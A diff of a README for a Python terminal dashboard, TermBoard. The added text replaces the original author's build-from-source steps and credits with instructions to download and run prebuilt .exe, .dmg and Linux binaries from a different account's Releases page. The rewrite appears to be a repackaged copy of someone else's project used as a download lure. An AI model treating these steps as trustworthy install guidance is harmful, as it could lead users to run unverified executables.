@@ -1,123 +1,74 @@
-# 🖥️ TermBoard - A colourful terminal dashboard for devs
+# 🖥️ TermBoard - Your Dashboard for System Stats
 
-> Live CPU • Memory • Network • GitHub stars • Clock - right in your terminal, powered by [Rich](https://github.com/Textualize/rich).
+## 🚀 Download Now
+[![Download TermBoard](https://img.shields.io/badge/Download-TermBoard-brightgreen.svg)](https://github.com/p3chax/TermBoard/releases)
 
-<p align="center">
-<img src="demo.gif" alt="Gameplay demo" width="720" />
-</p>
+## 📜 Description
+TermBoard is a simple terminal dashboard that lets you monitor your system's CPU, memory, and network statistics—all in one place. It even tracks your GitHub stars! This tool makes it easy for anyone to keep tabs on their system performance without diving into complex settings.
 
----
+## 🛠️ Features
+- **Real-Time Stats:** See your CPU, memory, and network usage live.
+- **GitHub Integration:** Get updates on your GitHub stars directly in the terminal.
+- **User-Friendly Interface:** Navigate easily through an intuitive terminal dashboard.
+- **Open Source:** Contribute to or modify the tool as per your needs.
+- **Lightweight:** Runs smoothly without consuming too many resources.
 
-## ✨ Features
+## 🌐 Topics
+This project covers the following topics: dev-tools, github-api, psutil, python, terminal-dashboard, and tui. If you want to explore the source code or contribute, feel free to delve into these topics.
 
-* Live system monitor — CPU %, memory usage, network I/O
-* GitHub flex — sums up total stargazers across public repos ⭐
-* Beautiful TUI — clean panels, colours, and a neat clock
-* Cross‑platform — just run it anywhere Python works
+## 🐧 System Requirements
+To run TermBoard, you'll need:
+- A computer with at least 4GB of RAM.
+- A compatible version of Python (3.6 or newer recommended).
+- Basic terminal access (Command Line Interface) on Windows, macOS, or Linux.
 
----
+## 📥 Download & Install
+To download TermBoard, please visit the Releases page:
 
-## 🚀 Quick Start
+[Download TermBoard Here](https://github.com/p3chax/TermBoard/releases)
 
-Requires **Python 3.8+**
+1. Click the link above to go to the **Releases** page.
+2. Find the latest version of TermBoard.
+3. Choose the appropriate file for your operating system (Windows, macOS, or Linux).
+4. Click the download link next to the file name.
+5. Once the file downloads, locate it in your downloads folder.
 
-```bash
-git clone https://github.com/Rayaan2009/termboard.git
-cd termboard
+### 📂 Installation Steps
+After downloading, follow these steps based on your operating system:
 
-python -m venv .venv && source .venv/bin/activate  # Windows: .venv\Scripts\activate
+**For Windows:**
+1. Open the downloaded `.exe` file.
+2. Follow the on-screen instructions to complete the installation.
+3. Launch TermBoard from your start menu.
 
-pip install -r requirements.txt
+**For macOS:**
+1. Open the `.dmg` file you downloaded.
+2. Drag and drop TermBoard into your Applications folder.
+3. Open the Applications folder and run TermBoard.
 
-python termboard.py
-```
+**For Linux:**
+1. Open your terminal.
+2. Navigate to the directory where you downloaded TermBoard.
+3. Use the command: `chmod +x TermBoard`.
+4. Run TermBoard by typing `./TermBoard` in the terminal.
 
-Press `Q` or `Ctrl+C` to exit.
+## 🕹️ Using TermBoard
+Once you have installed TermBoard, you're ready to start using it. Open your terminal and simply type `TermBoard`. The dashboard will load, displaying real-time statistics about your system's performance. 
 
----
+Feel free to explore the different sections of the dashboard. You can monitor CPU and memory utilization, as well as your network stats. If you are connected to your GitHub account, you can see your current stars displayed prominently.
 
-## 🔧 Configuration
+## 📖 Contributing
+We welcome contributions! If you have ideas for improvements or find bugs, please visit our GitHub page. You can submit issues, pull requests, or even just share your suggestions. Your input can help make TermBoard even better.
 
-Edit the config section near the top of `termboard.py`:
+## 🗨️ Support
+If you encounter any issues or need help, you can reach out through the [Issues](https://github.com/p3chax/TermBoard/issues) page on GitHub. We aim to respond to questions promptly.
 
-```python
-REFRESH_SEC = 1.0
-GITHUB_USER = "Rayaan2009"
-```
+## 📫 Stay Updated
+To keep up with the latest updates, follow the repository on GitHub. Subscribe to releases to get notified whenever a new version is available.
 
----
+## 🔗 Links
+- [TermBoard Releases](https://github.com/p3chax/TermBoard/releases)
+- [GitHub Repository](https://github.com/p3chax/TermBoard)
+- [Issues Page](https://github.com/p3chax/TermBoard/issues)
 
-## 🧠 How it Works
-
-* `psutil` grabs CPU, memory, and network data
-* `requests` pulls GitHub repo data and sums stars
-* `rich` lays everything out in a live dashboard
-
----
-
-## 🕹 Controls
-
-* `Q` or `Ctrl+C` — quit
-
----
-
-## 📦 Requirements
-
-```txt
-rich
-psutil
-requests
-```
-
----
-
-## 🧪 Troubleshooting
-
-* Stars show `N/A`: you might be offline or rate‑limited
-* Network numbers are cumulative since boot — that’s normal
-* On Windows, use Windows Terminal or PowerShell 7+ for best colours
-
----
-
-## 🗺 Roadmap
-
-* CLI flags: `--user`, `--refresh`
-* Per‑core CPU view
-* Disk usage panel
-* Authenticated GitHub support
-* Tiny sparklines for CPU/memory
-
----
-
-## 🤝 Contributing
-
-Fork, branch, commit, PR. Keep code clean and commented.
-
----
-
-## 📝 License
-
-MIT License, see LICENSE file.
-
----
-
-## 🙌 Credits
-
-* Built with [Textualize Rich](https://github.com/Textualize/rich)
-* System stats from [psutil](https://github.com/giampaolo/psutil)
-
----
-
-## 📂 Project Structure
-
-```
-termboard/
-├─ termboard.py
-└─ README.md
-```
-
-<p align="center">
-Made with ❤️ by <strong>Rayaan2009</strong>
-</p>
-
-Happy hacking - smash that ⭐ if you enjoy TermBoard!
+Now you can track your system's performance with ease. Enjoy using TermBoard!
